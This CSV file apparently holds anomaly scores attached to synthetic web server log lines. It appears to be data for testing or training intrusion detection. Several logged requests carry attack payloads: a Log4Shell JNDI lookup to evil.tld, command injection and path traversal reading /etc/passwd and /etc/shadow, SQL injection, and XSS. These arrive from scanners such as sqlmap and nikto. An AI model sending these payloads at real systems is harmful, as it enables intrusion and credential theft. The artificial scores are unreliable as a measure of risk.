score_content,score_session,score_fused,score_fused_norm,line
46.418827056884766,,46.418827056884766,46.418827056884766,2.119.195.233 - - [10/Jan/2025:12:30:03 +0000] "HEAD /api/products HTTP/1.1" 200 8052 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.770118713378906,,47.770118713378906,47.770118713378906,136.203.94.103 - - [10/Jan/2025:12:30:03 +0000] "HEAD /.env HTTP/1.1" 302 13092 "https://www.google.com/" "python-requests/2.31.0"
0.3119206130504608,,0.3119206130504608,0.3119206130504608,192.175.223.35 - - [10/Jan/2025:12:30:03 +0000] "GET /assets/app.js HTTP/1.1" 200 16525 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
125.14462280273438,,125.14462280273438,125.14462280273438,238.68.14.65 - - [10/Jan/2025:12:30:06 +0000] "TRACE /search?q=ssd HTTP/1.1" 201 17865 "https://news.ycombinator.com/" "nikto/2.5.0"
23.95634651184082,,23.95634651184082,23.95634651184082,9.76.188.86 - - [10/Jan/2025:12:30:06 +0000] "GET /search?q=headphones HTTP/1.1" 200 10819 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
71.17742156982422,,71.17742156982422,71.17742156982422,241.214.121.102 - - [10/Jan/2025:12:30:06 +0000] "HEAD /search?q=laptop HTTP/1.1" 304 6409 "https://twitter.com/" "dirb/2.22"
34.878841400146484,,34.878841400146484,34.878841400146484,26.96.107.250 - - [10/Jan/2025:12:30:07 +0000] "PUT /search?q=camera HTTP/1.1" 200 5949 "https://www.google.com/" "curl/7.85.0"
26.51966667175293,,26.51966667175293,26.51966667175293,198.178.94.26 - - [10/Jan/2025:12:30:09 +0000] "POST /search?q=headphones HTTP/1.1" 200 5229 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.27349039912223816,,0.27349039912223816,0.27349039912223816,102.118.47.80 - - [10/Jan/2025:12:30:09 +0000] "GET /assets/app.css HTTP/1.1" 200 12351 "https://twitter.com/" "dirb/2.22"
26.51312828063965,,26.51312828063965,26.51312828063965,96.112.43.55 - - [10/Jan/2025:12:30:10 +0000] "POST /search?q=headphones HTTP/1.1" 204 5274 "https://twitter.com/" "dirb/2.22"
46.316551208496094,,46.316551208496094,46.316551208496094,58.148.141.116 - - [10/Jan/2025:12:30:10 +0000] "HEAD /server-status HTTP/1.1" 200 8113 "-" "dirb/2.22"
94.00800323486328,,94.00800323486328,94.00800323486328,17.226.51.23 - - [10/Jan/2025:12:30:12 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 3382 "https://www.google.com/" "sqlmap/1.7.2#stable"
12.915212631225586,,12.915212631225586,12.915212631225586,91.64.104.245 - - [10/Jan/2025:12:30:12 +0000] "PUT /about HTTP/1.1" 200 14184 "https://www.google.com/" "sqlmap/1.7.2#stable"
30124.09375,,30124.09375,30124.09375,90.39.164.251 - - [10/Jan/2025:12:30:14 +0000] "GET /assets/app.css HTTP/1.1" 401 406 "https://example.com/" "python-requests/2.31.0"
71.89024353027344,,71.89024353027344,71.89024353027344,7.161.20.236 - - [10/Jan/2025:12:30:14 +0000] "OPTIONS /contact HTTP/1.1" 200 6662 "https://example.com/" "sqlmap/1.7.2#stable"
2.2533795833587646,,2.2533795833587646,2.2533795833587646,109.212.242.252 - - [10/Jan/2025:12:30:17 +0000] "GET / HTTP/1.1" 200 8064 "https://www.google.com/" "curl/7.85.0"
125.04055786132812,,125.04055786132812,125.04055786132812,143.124.73.160 - - [10/Jan/2025:12:30:19 +0000] "TRACE /search?q=camera HTTP/1.1" 200 8312 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.95030975341797,,71.95030975341797,71.95030975341797,8.153.173.139 - - [10/Jan/2025:12:30:20 +0000] "OPTIONS /admin HTTP/1.1" 200 1447 "-" "curl/7.85.0"
125.08232116699219,,125.08232116699219,125.08232116699219,128.43.30.98 - - [10/Jan/2025:12:30:20 +0000] "TRACE /search?q=phone HTTP/1.1" 200 13620 "https://www.google.com/" "dirb/2.22"
30225.7109375,,30225.7109375,30225.7109375,230.99.208.168 - - [10/Jan/2025:12:30:23 +0000] "TRACE /about HTTP/1.1" 403 699 "https://example.com/" "nikto/2.5.0"
26.783899307250977,,26.783899307250977,26.783899307250977,205.109.7.10 - - [10/Jan/2025:12:30:24 +0000] "DELETE /profile HTTP/1.1" 204 4611 "https://example.com/" "sqlmap/1.7.2#stable"
46.5868034362793,,46.5868034362793,46.5868034362793,11.223.235.89 - - [10/Jan/2025:12:30:24 +0000] "HEAD /admin HTTP/1.1" 200 11281 "https://www.google.com/" "python-requests/2.31.0"
51.36697769165039,,51.36697769165039,51.36697769165039,9.225.128.105 - - [10/Jan/2025:12:30:25 +0000] "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 6566 "-" "curl/7.85.0"
3.06789493560791,,3.06789493560791,3.06789493560791,62.12.202.156 - - [10/Jan/2025:12:30:25 +0000] "GET /index.html HTTP/1.1" 304 15336 "https://twitter.com/" "python-requests/2.31.0"
26.886985778808594,,26.886985778808594,26.886985778808594,147.200.59.25 - - [10/Jan/2025:12:30:28 +0000] "DELETE /login HTTP/1.1" 200 10013 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
68.56079864501953,,68.56079864501953,68.56079864501953,253.58.238.253 - - [10/Jan/2025:12:30:31 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 200 8565 "https://twitter.com/" "sqlmap/1.7.2#stable"
72.00687408447266,,72.00687408447266,72.00687408447266,112.241.81.48 - - [10/Jan/2025:12:30:34 +0000] "OPTIONS /about HTTP/1.1" 200 19303 "https://www.google.com/" "sqlmap/1.7.2#stable"
12.893646240234375,,12.893646240234375,12.893646240234375,70.47.210.68 - - [10/Jan/2025:12:30:35 +0000] "PUT /logout HTTP/1.1" 200 19885 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
4.454254627227783,,4.454254627227783,4.454254627227783,215.188.126.52 - - [10/Jan/2025:12:30:36 +0000] "POST /phpmyadmin HTTP/1.1" 200 11404 "https://example.com/" "python-requests/2.31.0"
23.973543167114258,,23.973543167114258,23.973543167114258,27.194.237.4 - - [10/Jan/2025:12:30:37 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 11766 "https://example.com/" "dirb/2.22"
127.8370361328125,,127.8370361328125,127.8370361328125,183.212.150.248 - - [10/Jan/2025:12:30:40 +0000] "TRACE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 304 2255 "https://news.ycombinator.com/" "python-requests/2.31.0"
30157.900390625,,30157.900390625,30157.900390625,66.69.33.49 - - [10/Jan/2025:12:30:43 +0000] "PUT /search?q=laptop HTTP/1.1" 401 252 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
3.0178911685943604,,3.0178911685943604,3.0178911685943604,225.58.12.19 - - [10/Jan/2025:12:30:45 +0000] "GET /index.html HTTP/1.1" 301 18828 "https://www.google.com/" "python-requests/2.31.0"
26.566377639770508,,26.566377639770508,26.566377639770508,44.173.124.12 - - [10/Jan/2025:12:30:47 +0000] "GET /search?q=headphones HTTP/1.1" 302 9389 "-" "python-requests/2.31.0"
30128.056640625,,30128.056640625,30128.056640625,195.130.61.245 - - [10/Jan/2025:12:30:50 +0000] "POST /profile HTTP/1.1" 400 306 "-" "Wget/1.21.2 (linux-gnu)"
30149.423828125,,30149.423828125,30149.423828125,179.174.140.97 - - [10/Jan/2025:12:30:53 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 429 1195 "-" "nikto/2.5.0"
30124.11328125,,30124.11328125,30124.11328125,149.208.21.66 - - [10/Jan/2025:12:30:54 +0000] "GET /assets/app.js HTTP/1.1" 401 456 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30150.037109375,,30150.037109375,30150.037109375,110.176.107.37 - - [10/Jan/2025:12:30:56 +0000] "DELETE /login HTTP/1.1" 401 716 "https://www.google.com/" "curl/7.85.0"
15.527410507202148,,15.527410507202148,15.527410507202148,98.146.160.196 - - [10/Jan/2025:12:30:57 +0000] "PUT /login HTTP/1.1" 302 12462 "https://twitter.com/" "dirb/2.22"
15.510062217712402,,15.510062217712402,15.510062217712402,34.127.12.159 - - [10/Jan/2025:12:30:59 +0000] "PUT /admin HTTP/1.1" 302 7750 "https://www.google.com/" "python-requests/2.31.0"
48.88981628417969,,48.88981628417969,48.88981628417969,31.132.16.25 - - [10/Jan/2025:12:30:59 +0000] "DELETE /search?q=phone HTTP/1.1" 200 8762 "-" "Wget/1.21.2 (linux-gnu)"
11049.1787109375,,11049.1787109375,11049.1787109375,224.239.204.227 - - [10/Jan/2025:12:31:01 +0000] "PUT /about HTTP/1.1" 500 138 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.564226150512695,,4.564226150512695,4.564226150512695,163.95.217.248 - - [10/Jan/2025:12:31:01 +0000] "POST /contact HTTP/1.1" 200 14409 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
93.88540649414062,,93.88540649414062,93.88540649414062,59.147.40.174 - - [10/Jan/2025:12:31:04 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 15408 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
7.22841215133667,,7.22841215133667,7.22841215133667,99.82.249.215 - - [10/Jan/2025:12:31:05 +0000] "POST /contact HTTP/1.1" 304 16393 "https://example.com/" "curl/7.85.0"
24.06464195251465,,24.06464195251465,24.06464195251465,242.66.6.14 - - [10/Jan/2025:12:31:08 +0000] "GET /api/product?id=123 HTTP/1.1" 200 14378 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
127.66864776611328,,127.66864776611328,127.66864776611328,145.134.79.127 - - [10/Jan/2025:12:31:08 +0000] "TRACE /search?q=monitor HTTP/1.1" 304 8669 "-" "python-requests/2.31.0"
30157.8359375,,30157.8359375,30157.8359375,23.191.71.25 - - [10/Jan/2025:12:31:10 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 400 640 "https://twitter.com/" "python-requests/2.31.0"
0.2747957110404968,,0.2747957110404968,0.2747957110404968,162.113.180.35 - - [10/Jan/2025:12:31:12 +0000] "GET /assets/app.js HTTP/1.1" 200 6337 "https://example.com/" "python-requests/2.31.0"
25.199155807495117,,25.199155807495117,25.199155807495117,201.22.83.241 - - [10/Jan/2025:12:31:14 +0000] "DELETE /.git/config HTTP/1.1" 200 9156 "https://news.ycombinator.com/" "dirb/2.22"
102.91592407226562,,102.91592407226562,102.91592407226562,158.48.97.8 - - [10/Jan/2025:12:31:15 +0000] "TRACE /phpmyadmin HTTP/1.1" 200 13149 "https://twitter.com/" "python-requests/2.31.0"
93.9533462524414,,93.9533462524414,93.9533462524414,205.172.48.214 - - [10/Jan/2025:12:31:18 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 12923 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
68.75655364990234,,68.75655364990234,68.75655364990234,149.149.210.233 - - [10/Jan/2025:12:31:21 +0000] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17593 "-" "nikto/2.5.0"
26.552143096923828,,26.552143096923828,26.552143096923828,143.63.44.117 - - [10/Jan/2025:12:31:22 +0000] "POST /search?q=headphones HTTP/1.1" 200 13648 "https://example.com/" "nikto/2.5.0"
2.2844979763031006,,2.2844979763031006,2.2844979763031006,78.252.152.235 - - [10/Jan/2025:12:31:25 +0000] "GET / HTTP/1.1" 200 16980 "https://example.com/" "curl/7.85.0"
103.98583984375,,103.98583984375,103.98583984375,113.19.71.218 - - [10/Jan/2025:12:31:26 +0000] "TRACE /.git/config HTTP/1.1" 301 6992 "-" "python-requests/2.31.0"
34.89122772216797,,34.89122772216797,34.89122772216797,68.88.22.124 - - [10/Jan/2025:12:31:26 +0000] "PUT /search?q=laptop HTTP/1.1" 200 8987 "https://twitter.com/" "sqlmap/1.7.2#stable"
30169.544921875,,30169.544921875,30169.544921875,66.85.221.199 - - [10/Jan/2025:12:31:27 +0000] "HEAD /contact HTTP/1.1" 403 636 "-" "python-requests/2.31.0"
26.622211456298828,,26.622211456298828,26.622211456298828,69.109.220.247 - - [10/Jan/2025:12:31:27 +0000] "POST /api/product?id=123 HTTP/1.1" 200 7904 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
74.56216430664062,,74.56216430664062,74.56216430664062,25.208.201.249 - - [10/Jan/2025:12:31:29 +0000] "OPTIONS /contact HTTP/1.1" 302 139 "https://example.com/" "python-requests/2.31.0"
26.8585262298584,,26.8585262298584,26.8585262298584,212.128.153.126 - - [10/Jan/2025:12:31:31 +0000] "DELETE /login HTTP/1.1" 200 2904 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.90052604675293,,26.90052604675293,26.90052604675293,144.205.240.172 - - [10/Jan/2025:12:31:31 +0000] "DELETE /about HTTP/1.1" 200 13912 "-" "curl/7.85.0"
48.73994064331055,,48.73994064331055,48.73994064331055,143.18.158.148 - - [10/Jan/2025:12:31:32 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 11737 "https://www.google.com/" "sqlmap/1.7.2#stable"
3.197011709213257,,3.197011709213257,3.197011709213257,249.116.217.204 - - [10/Jan/2025:12:31:35 +0000] "POST /.env HTTP/1.1" 200 18678 "https://twitter.com/" "nikto/2.5.0"
34.91445541381836,,34.91445541381836,34.91445541381836,4.219.2.9 - - [10/Jan/2025:12:31:37 +0000] "PUT /search?q=laptop HTTP/1.1" 200 250 "https://www.google.com/" "curl/7.85.0"
30124.076171875,,30124.076171875,30124.076171875,57.137.224.136 - - [10/Jan/2025:12:31:39 +0000] "GET /assets/app.css HTTP/1.1" 400 254 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
4.6507720947265625,,4.6507720947265625,4.6507720947265625,145.194.222.102 - - [10/Jan/2025:12:31:42 +0000] "GET /logout HTTP/1.1" 304 4294 "-" "sqlmap/1.7.2#stable"
30125.673828125,,30125.673828125,30125.673828125,87.79.166.223 - - [10/Jan/2025:12:31:42 +0000] "GET /dashboard HTTP/1.1" 403 1149 "https://www.google.com/" "nikto/2.5.0"
0.31305593252182007,,0.31305593252182007,0.31305593252182007,79.116.27.74 - - [10/Jan/2025:12:31:45 +0000] "GET /assets/app.js HTTP/1.1" 200 220 "https://example.com/" "dirb/2.22"
125.0593032836914,,125.0593032836914,125.0593032836914,118.70.134.141 - - [10/Jan/2025:12:31:48 +0000] "TRACE /search?q=router HTTP/1.1" 200 13706 "-" "Wget/1.21.2 (linux-gnu)"
3.0095512866973877,,3.0095512866973877,3.0095512866973877,244.26.35.54 - - [10/Jan/2025:12:31:49 +0000] "GET /wp-login.php HTTP/1.1" 304 15271 "https://twitter.com/" "dirb/2.22"
68.57532501220703,,68.57532501220703,68.57532501220703,219.206.89.126 - - [10/Jan/2025:12:31:50 +0000] "HEAD /api/product?id=123 HTTP/1.1" 204 14971 "-" "nikto/2.5.0"
0.26111677289009094,,0.26111677289009094,0.26111677289009094,208.206.96.54 - - [10/Jan/2025:12:31:51 +0000] "GET /assets/app.js HTTP/1.1" 200 3133 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
96.5240249633789,,96.5240249633789,96.5240249633789,97.175.251.43 - - [10/Jan/2025:12:31:53 +0000] "OPTIONS /search?q=camera HTTP/1.1" 301 8699 "-" "Wget/1.21.2 (linux-gnu)"
30128.1171875,,30128.1171875,30128.1171875,165.185.132.1 - - [10/Jan/2025:12:31:55 +0000] "POST /phpmyadmin HTTP/1.1" 404 316 "-" "sqlmap/1.7.2#stable"
2.2895069122314453,,2.2895069122314453,2.2895069122314453,98.16.200.73 - - [10/Jan/2025:12:31:58 +0000] "GET / HTTP/1.1" 200 18713 "https://twitter.com/" "curl/7.85.0"
93.99520874023438,,93.99520874023438,93.99520874023438,117.251.170.153 - - [10/Jan/2025:12:31:58 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 19373 "https://twitter.com/" "nikto/2.5.0"
124.990234375,,124.990234375,124.990234375,92.166.154.75 - - [10/Jan/2025:12:31:59 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 16155 "https://twitter.com/" "python-requests/2.31.0"
24.09589385986328,,24.09589385986328,24.09589385986328,225.243.149.141 - - [10/Jan/2025:12:31:59 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 4697 "https://twitter.com/" "python-requests/2.31.0"
26.533123016357422,,26.533123016357422,26.533123016357422,39.82.78.21 - - [10/Jan/2025:12:32:02 +0000] "POST /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 6207 "https://example.com/" "sqlmap/1.7.2#stable"
11062.87109375,,11062.87109375,11062.87109375,208.88.239.116 - - [10/Jan/2025:12:32:03 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 503 1317 "https://twitter.com/" "python-requests/2.31.0"
26.512182235717773,,26.512182235717773,26.512182235717773,91.155.70.51 - - [10/Jan/2025:12:32:05 +0000] "POST /search?q=headphones HTTP/1.1" 200 1131 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
25.051637649536133,,25.051637649536133,25.051637649536133,115.135.203.244 - - [10/Jan/2025:12:32:07 +0000] "DELETE /../../etc/passwd HTTP/1.1" 200 3596 "https://www.google.com/" "python-requests/2.31.0"
51.4505500793457,,51.4505500793457,51.4505500793457,2.11.225.196 - - [10/Jan/2025:12:32:07 +0000] "DELETE /search?q=monitor HTTP/1.1" 301 18416 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.058551788330078,,24.058551788330078,24.058551788330078,39.232.104.186 - - [10/Jan/2025:12:32:08 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12542 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
25.458953857421875,,25.458953857421875,25.458953857421875,41.50.30.118 - - [10/Jan/2025:12:32:08 +0000] "DELETE /.env HTTP/1.1" 200 13308 "https://example.com/" "dirb/2.22"
4.574260234832764,,4.574260234832764,4.574260234832764,195.209.111.149 - - [10/Jan/2025:12:32:09 +0000] "POST /logout HTTP/1.1" 204 8651 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.30649828910827637,,0.30649828910827637,0.30649828910827637,64.116.74.227 - - [10/Jan/2025:12:32:12 +0000] "GET /assets/app.js HTTP/1.1" 200 14779 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30125.294921875,,30125.294921875,30125.294921875,53.134.182.21 - - [10/Jan/2025:12:32:14 +0000] "GET /assets/app.js HTTP/1.1" 429 988 "-" "dirb/2.22"
68.46467590332031,,68.46467590332031,68.46467590332031,137.174.244.176 - - [10/Jan/2025:12:32:15 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 4756 "https://www.google.com/" "nikto/2.5.0"
48.884765625,,48.884765625,48.884765625,236.14.60.114 - - [10/Jan/2025:12:32:16 +0000] "DELETE /search?q=router HTTP/1.1" 200 13894 "https://twitter.com/" "nikto/2.5.0"
94.01123809814453,,94.01123809814453,94.01123809814453,40.71.190.23 - - [10/Jan/2025:12:32:18 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 8207 "-" "sqlmap/1.7.2#stable"
4.50658655166626,,4.50658655166626,4.50658655166626,8.157.103.162 - - [10/Jan/2025:12:32:20 +0000] "POST /dashboard HTTP/1.1" 200 17916 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2948354482650757,,0.2948354482650757,0.2948354482650757,176.89.247.226 - - [10/Jan/2025:12:32:23 +0000] "GET /assets/app.css HTTP/1.1" 200 19226 "https://news.ycombinator.com/" "nikto/2.5.0"
71.90929412841797,,71.90929412841797,71.90929412841797,229.236.16.238 - - [10/Jan/2025:12:32:24 +0000] "OPTIONS /contact HTTP/1.1" 200 11717 "https://example.com/" "sqlmap/1.7.2#stable"
68.44537353515625,,68.44537353515625,68.44537353515625,7.239.21.201 - - [10/Jan/2025:12:32:24 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 18860 "https://twitter.com/" "sqlmap/1.7.2#stable"
93.9771728515625,,93.9771728515625,93.9771728515625,188.132.79.46 - - [10/Jan/2025:12:32:24 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 13145 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
1.9426817893981934,,1.9426817893981934,1.9426817893981934,235.244.19.211 - - [10/Jan/2025:12:32:27 +0000] "GET /profile HTTP/1.1" 200 1061 "https://www.google.com/" "sqlmap/1.7.2#stable"
0.2828752100467682,,0.2828752100467682,0.2828752100467682,106.156.87.92 - - [10/Jan/2025:12:32:27 +0000] "GET /assets/app.js HTTP/1.1" 200 8247 "https://www.google.com/" "nikto/2.5.0"
68.57405853271484,,68.57405853271484,68.57405853271484,171.211.182.227 - - [10/Jan/2025:12:32:30 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 12368 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.88611602783203,,26.88611602783203,26.88611602783203,33.72.187.66 - - [10/Jan/2025:12:32:32 +0000] "DELETE /about HTTP/1.1" 200 9781 "https://example.com/" "nikto/2.5.0"
29.39141082763672,,29.39141082763672,29.39141082763672,172.105.68.218 - - [10/Jan/2025:12:32:34 +0000] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 301 340 "-" "nikto/2.5.0"
46.422794342041016,,46.422794342041016,46.422794342041016,193.219.168.205 - - [10/Jan/2025:12:32:34 +0000] "HEAD /api/products HTTP/1.1" 200 9067 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.045971155166626,,3.045971155166626,3.045971155166626,7.9.230.201 - - [10/Jan/2025:12:32:34 +0000] "GET /index.html HTTP/1.1" 304 9056 "https://news.ycombinator.com/" "dirb/2.22"
71.19745635986328,,71.19745635986328,71.19745635986328,153.115.142.70 - - [10/Jan/2025:12:32:35 +0000] "HEAD /search?q=phone HTTP/1.1" 302 17212 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
124.93400573730469,,124.93400573730469,124.93400573730469,24.89.201.205 - - [10/Jan/2025:12:32:38 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 16669 "https://news.ycombinator.com/" "python-requests/2.31.0"
